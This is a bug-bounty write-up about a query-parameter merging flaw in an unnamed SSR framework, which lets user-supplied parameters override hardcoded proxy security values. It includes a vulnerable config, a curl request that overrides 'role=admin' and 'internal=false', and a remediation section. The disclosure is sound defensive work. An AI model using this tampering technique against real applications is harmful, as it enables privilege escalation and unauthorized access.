---
title: "Proxy Routing Bypasses in Modern SSR Frameworks"
description: This writeup explores a recently discovered architectural flaw where silent query parameter merging allows attackers to overwrite hardcoded security configurations.
date: 2026-07-02
author: Mikey
tags: ["Research"]
---

# Case Study: Query Parameter Override in Modern SSR Frameworks

**Vulnerability Type:** Business Logic / Proxy Configuration Bypass  
**Severity:** Medium/High (Context Dependent)  
**Status:** Redacted / Awaiting Vendor Patch  

*Disclaimer: This write-up discusses a vulnerability found during authorized bug bounty research. All identifying details, framework names, and specific endpoints have been completely redacted to protect the vendor while the issue remains unpatched.*

## Overview

Modern Server Side Rendering (SSR) frameworks often provide developers with built-in routing rules to proxy requests to internal microservices or external APIs. 

During a recent code review of a popular open-source web framework, I discovered a flaw in how the framework merges HTTP query parameters under the hood. When a developer hardcodes specific query parameters into a proxy rule (e.g., `?trusted=true`), the framework's internal URL parsing utility appends user supplied query strings *after* the developer's hardcoded strings. 

Because standard URL parsers typically prioritize the last supplied value for a given key, an attacker can completely overwrite the developer's intended security parameters.

## Technical Breakdown

### The Intended Configuration

Developers frequently use route rules to enforce security boundaries without writing custom middleware. A vulnerable configuration looks like this:

```jsx
import { defineFrameworkConfig } from 'framework/config'

export default defineFrameworkConfig({
  routeRules: {
    '/api/data': {
      // Developer intends to force 'internal=true' and 'role=user'
      proxy: 'https://internal-backend.local/get?internal=true&role=user'
    }
  }
})
```

### The Exploitation

Because the internal utility merges user queries blindly, we can supply the exact same parameter keys in our external request to overwrite the hardcoded values.

**Malicious Request:**

```bash
curl -s "http://target-application.com/api/data?internal=false&role=admin" | jq .
```

**Backend Response:**
The backend server receives the attacker's parameters, and the framework completely discards the developer's hardcoded config.

```json
{
  "args": {
    "internal": "false",
    "role": "admin"
  },
  "url": "https://internal-backend.local/get?internal=false&role=admin"
}
```

## Security Impact

This framework level routing flaw leaves any application utilizing parameter based proxy security vulnerable. Developers explicitly hardcode parameters with the reasonable expectation that they are immutable. Because this merge logic happens silently, it creates severe attack vectors:

1. **Backend Trust Bypass:** Overriding internal flags (e.g., `?trusted=true` to `?trusted=false`) when proxying to internal microservices that blindly trust the API gateway.
2. **OAuth Scope Escalation:** Overwriting hardcoded, read only scopes in redirect rules (e.g., changing `scope=read` to `scope=admin:write` before the authorization flow begins).

## Remediation Strategy

Framework maintainers should implement a strict parameter prioritization model in their internal URL merge utilities. Hardcoded configuration values must always take precedence over dynamic, user supplied query parameters, or the framework should emit a fatal error when a key collision is detected during a proxy event.
